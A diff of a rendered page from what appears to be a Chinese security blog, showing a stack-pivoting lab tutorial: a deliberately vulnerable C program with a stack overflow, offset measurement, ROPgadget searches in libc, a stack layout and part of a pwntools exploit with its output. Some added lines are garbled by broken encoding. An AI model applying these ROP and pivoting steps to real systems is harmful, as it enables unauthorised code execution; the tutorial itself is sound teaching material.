@@ -142,28 +142,22 @@
     <div class="post-toc-content">
         <nav id="TableOfContents">
   <ul>
-    <li><a href="#1-what-">1 what ？</a></li>
-    <li><a href="#2-why">2 why</a></li>
-    <li><a href="#3-how">3 how</a>
+    <li><a href="#31-pop-rsp-gadget">3.1 pop rsp gadget</a></li>
+    <li><a href="#32-xchg-reg-rsp">3.2 xchg <!-- raw HTML omitted -->, rsp</a></li>
+    <li><a href="#33-leaveret">3.3 leave;ret</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#41--vuln脆弱性">4.1  vuln脆弱性</a></li>
+    <li><a href="#42-vuln脆弱性利用目标">4.2 vuln脆弱性利用目标</a></li>
+    <li><a href="#43-vuln利用步骤">4.3 vuln利用步骤</a>
       <ul>
-        <li><a href="#31-pop-rsp-gadget">3.1 pop rsp gadget</a></li>
-        <li><a href="#32-xchg-reg-rsp">3.2 xchg <!-- raw HTML omitted -->, rsp</a></li>
-        <li><a href="#33-leaveret">3.3 leave;ret</a></li>
-      </ul>
-    </li>
-    <li><a href="#4-漏洞程序-vuln">4 漏洞程序 vuln</a>
-      <ul>
-        <li><a href="#41-vuln脆弱性">4.1 vuln脆弱性</a></li>
-        <li><a href="#42-vuln脆弱性利用目标">4.2 vuln脆弱性利用目标</a></li>
-        <li><a href="#43-vuln利用步骤">4.3 vuln利用步骤</a>
-          <ul>
-            <li><a href="#431-测算rip的偏移">4.3.1 测算rip的偏移</a></li>
-            <li><a href="#432-寻找可用gadget">4.3.2 寻找可用gadget</a></li>
-            <li><a href="#433-规划栈布局">4.3.3 规划栈布局</a></li>
-            <li><a href="#434-pwntools编写利用代码">4.3.4 pwntools编写利用代码</a></li>
-            <li><a href="#exploit-output"><strong>exploit output</strong></a></li>
-          </ul>
-        </li>
+        <li><a href="#431-测算rip的偏移">4.3.1 测算rip的偏移</a></li>
+        <li><a href="#432-寻找可用gadget">4.3.2 寻找可用gadget</a></li>
+        <li><a href="#433-规划栈布局">4.3.3 规划栈布局</a></li>
+        <li><a href="#434-pwntools编写利用代码">4.3.4 pwntools编写利用代码</a></li>
+        <li><a href="#434-pwntoolsдô">4.3.4 pwntools��д���ô���</a></li>
+        <li><a href="#exploit-output"><strong>exploit output</strong></a></li>
       </ul>
     </li>
   </ul>
@@ -230,7 +224,7 @@
         </div>
         
         <div class="post-content">
-            <h1 id="1-what-">1 what ？</h1>
+            <h1 id="1-what">1 what</h1>
 <p>stack pivoiting是一种栈空间转移技术</p>
 <h1 id="2-why">2 why</h1>
 <p>有时候缓冲区有长度限制，不利于在栈上配置rop gadget(空间不够)！</p>
@@ -272,7 +266,7 @@ int main() {
     vuln();
     return 0;
 }
-</code></pre><h2 id="41-vuln脆弱性">4.1 vuln脆弱性</h2>
+</code></pre><h2 id="41--vuln脆弱性">4.1  vuln脆弱性</h2>
 <ul>
 <li>存在输入性栈溢出，buffer大小0x60</li>
 <li>fgets存在输入大小限制，0x80上界</li>
@@ -311,7 +305,7 @@ Try pivoting to: 0x7ffcd3256000
 AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA
 [+] SIGNAL 11 errno=0 addr=0x00000000 code=128 si_pid=0 ret=0
 </code></pre><ol start="3">
-<li><strong>确定rip偏移</strong></li>
+<li><strong>确定rip</strong></li>
 </ol>
 <pre tabindex="0"><code>[0x004011c5]&gt; dr rbp
 0x4169414168414167
@@ -319,12 +313,10 @@ AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaA
 96
 </code></pre><p>所以，rip的偏移是104 = 96 + 8</p>
 <ol start="4">
-<li><strong>猜测栈基本布局</strong></li>
+<li>猜测栈基本布局<br>
+stack ::= |+00 buffer | +96 rbp | +104 rip | +112 x1 | +120 x2 | +128 x3 |
+因为fgets输入长度限制是0x80==128,而且，栈不可执行shellcode，所以，可以覆盖的区域只有 rip，x1，x2 三个变量的地址，且只能用rop gadget方式。</li>
 </ol>
-<ul>
-<li><strong>stack ::= |+00 buffer | +96 rbp |  +104 rip | +112  x1 |  +120 x2 | +128 x3 |</strong></li>
-</ul>
-<p>因为fgets输入长度限制是0x80==128,而且，栈不可执行shellcode，所以，可以覆盖的区域只有 rip，x1，x2 三个变量的地址，且只能用rop gadget方式。</p>
 <h3 id="432-寻找可用gadget">4.3.2 寻找可用gadget</h3>
 <ol>
 <li>pop rdi</li>
@@ -341,33 +333,35 @@ AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaA
 </code></pre><ul>
 <li>ROPgadget寻找libc</li>
 </ul>
-<pre tabindex="0"><code>└─$ ldd vuln       
+<pre tabindex="0"><code>$ ldd vuln       
         linux-vdso.so.1 (0x00007ffff7fc9000)
         libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dce000)
         /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
 
-┌──(kali㉿kali)-[~/exploits/spivot]
-└─$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6  | grep   &#39;pop rdi ; ret&#39;
+(kali?kali)-[~/exploits/spivot]
+$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep &#39;pop rdi ; ret&#39;
 0x0000000000027725 : pop rdi ; ret
 0x0000000000065b7d : pop rdi ; ret 0x16
 </code></pre><p>所以，<strong>POP_RDI = 0x00007f85682b0000 + 0x027725</strong></p>
 <ol start="2">
 <li>pop rsi</li>
 </ol>
-<pre tabindex="0"><code>┌──(kali㉿kali)-[~/exploits/spivot]
-└─$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6  | grep   &#39;pop rsi ; ret&#39;
+<pre tabindex="0"><code>(kali?kali)-[~/exploits/spivot]
+$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep &#39;pop rsi ; ret&#39;
 0x0000000000028ed9 : pop rsi ; ret
 0x0000000000085336 : pop rsi ; retf
 </code></pre><p>所以，<strong>POP_RSI = 0x00007f85682b0000 + 0x028ed9</strong></p>
 <ol start="3">
 <li>pop rsp</li>
 </ol>
-<pre tabindex="0"><code>┌──(kali㉿kali)-[~/exploits/spivot]
-└─$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6  | grep   &#39;pop rsp&#39;
+<pre tabindex="0"><code>(kali?kali)-[~/exploits/spivot]
+$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep &#39;pop rsp&#39;
 ...
 0x00000000000fd999 : pop rsp ; jmp 0xfd8e0
 0x00000000000ff3b6 : pop rsp ; jmp 0xff1c0
 0x00000000000db8b8 : pop rsp ; jmp 0xffffffff8552b8cd
+...
+0x00000000000273aa : pop rsp ; ret
 ...
 0x00000000000273aa : pop rsp ; ret
 </code></pre><p>所以，<strong>POP_RSP = 0x00007f85682b0000 + 0x0273aa</strong></p>
@@ -410,6 +404,7 @@ AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaA
 </tbody>
 </table>
 <h3 id="434-pwntools编写利用代码">4.3.4 pwntools编写利用代码</h3>
+<h3 id="434-pwntoolsдô">4.3.4 pwntools��д���ô���</h3>
 <pre tabindex="0"><code>from pwn import *
 elf = context.binary = ELF(&#39;./vuln&#39;)
 
@@ -435,7 +430,7 @@ p.sendline(payload)
 
 print(p.recvline())
 </code></pre><h3 id="exploit-output"><strong>exploit output</strong></h3>
-<pre tabindex="0"><code>└─$ python exploit.py      
+<pre tabindex="0"><code>$ python exploit.py      
 [*] &#39;/home/kali/exploits/spivot/vuln&#39;
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -615,6 +610,10 @@ print(p.recvline())
 <ul class="widget-list">
     
     <li>
+        <a href="https://winsun.github.io/fightsec/post/pwn_17_stack_canary/" title="Pwn_17_stack_canary">Pwn_17_stack_canary</a>
+    </li>
+    
+    <li>
         <a href="https://winsun.github.io/fightsec/post/knl_02_syscall/" title="linux kernel : system call">linux kernel : system call</a>
     </li>
     
@@ -650,10 +649,6 @@ print(p.recvline())
         <a href="https://winsun.github.io/fightsec/post/cyber_09_zero_trust/" title="零信任架构">零信任架构</a>
     </li>
     
-    <li>
-        <a href="https://winsun.github.io/fightsec/post/cyber_08_bastion/" title="堡垒机及安全">堡垒机及安全</a>
-    </li>
-    
 </ul>
     </section>
 
@@ -681,7 +676,7 @@ print(p.recvline())
     
     <li><a href="https://winsun.github.io/fightsec/categories/linux/">linux (15)</a></li>
     
-    <li><a href="https://winsun.github.io/fightsec/categories/pwn/">pwn (17)</a></li>
+    <li><a href="https://winsun.github.io/fightsec/categories/pwn/">pwn (18)</a></li>
     
     <li><a href="https://winsun.github.io/fightsec/categories/reverse/">reverse (2)</a></li>
     
